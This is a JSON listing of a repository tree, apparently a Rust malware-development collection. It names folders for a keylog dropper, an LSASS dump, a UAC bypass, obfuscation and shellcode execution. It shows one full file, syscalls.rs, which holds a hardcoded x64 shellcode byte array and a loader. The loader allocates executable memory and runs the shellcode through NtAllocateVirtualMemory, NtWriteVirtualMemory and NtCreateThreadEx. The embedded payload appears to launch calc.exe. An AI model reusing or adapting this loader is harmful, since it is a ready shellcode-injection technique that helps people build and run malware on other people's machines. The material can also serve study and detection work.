cpuid cmd\");\n\n//     let output_str = String::from_utf8_lossy(&output.stdout);\n//     output_str.contains(vendor_string)\n// }\n\n// Program to use WMI Quaries to retrieve sys info !\n\n// System Firmware tables \n// Get Syetem frimwares => soon !\n"
        },
        {
          "name": "images",
          "type": "tree",
          "content": null
        },
        {
          "name": "keylog_dropper",
          "type": "tree",
          "content": null
        },
        {
          "name": "lsass_dump",
          "type": "tree",
          "content": null
        },
        {
          "name": "maldev_rust.png",
          "type": "blob",
          "size": 185.5595703125,
          "content": null
        },
        {
          "name": "obfuscation",
          "type": "tree",
          "content": null
        },
        {
          "name": "position independent",
          "type": "tree",
          "content": null
        },
        {
          "name": "shellcode_exec",
          "type": "tree",
          "content": null
        },
        {
          "name": "syscalls.rs",
          "type": "blob",
          "size": 3.6533203125,
          "content": "/*\n    Basics Syscalls to Carry out SHellcode Execution ..!\n    For more Codes: https://github.com/Whitecat18/Rust-for-Malware-Development.git\n    @5mukx\n*/\n\nuse std::{ptr::null_mut, thread::sleep, time::Duration};\n\nuse ntapi::{ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory}, ntpsapi::NtCreateThreadEx};\nuse winapi::{ctypes::c_void, shared::basetsd::PSIZE_T, um::winnt::THREAD_ALL_ACCESS};\n\nmacro_rules! error {\n    ($msg:expr) => {\n        println!(\"\\\\_____[-] {}\", format!($msg));\n        println!(\"Exiting ...\");\n    }\n}\n\n\nfn main(){\n    let mut shellcode: [u8; 276] = [\n        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,\n        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,\n        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,\n        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,\n        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,\n        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,\n        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,\n        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,\n        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,\n        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,\n        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,\n        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,\n        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,\n        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,\n        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,\n        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,\n        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,\n        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,\n        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,\n    ];\n\n    unsafe{\n        let handle = -1isize as *mut c_void;\n\n        let mut address = null_mut() as *mut c_void;\n    \n        let nt_allocate = NtAllocateVirtualMemory(\n            handle,\n            &mut address,\n            0,\n            &mut shellcode.len(),\n            0x00001000 | 0x00002000, // MEM_COMMIT | MEM_RESERVE \n            0x40,  \n        );\n\n        if nt_allocate != 0{\n            error!(\"NtAllocateVirtualMemory Failed\");\n            return;\n        }\n\n        let number_of_write: PSIZE_T = null_mut();\n        \n        let nt_write = NtWriteVirtualMemory(\n            handle,\n            address,\n            shellcode.as_mut_ptr() as *mut c_void,\n            shellcode.len(),\n            number_of_write,\n        );\n\n        if nt_write != 0 {\n            println!(\"NtWriteVirtualMemory Failed\");\n            return;\n        }\n\n        let mut hthread = null_mut() as *mut c_void;\n\n        let nt_create = NtCreateThreadEx(\n            &mut hthread,\n            THREAD_ALL_ACCESS,\n            null_mut(),\n            handle,\n            address,\n            null_mut(),\n            0,\n            0,\n            0,\n            0,\n            null_mut(),\n        );\n\n        if nt_create !=0{\n            error!(\"NtCreateThreadEx Failed\");\n            return;\n        }\n        sleep(Duration::from_secs(2));\n    }\n}\n\n"
        },
        {
          "name": "syscalls",
          "type": "tree",
          "content": null
        },
        {
          "name": "timer",
          "type": "tree",
          "content": null
        },
        {
          "name": "uac-bypass-cmstp",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}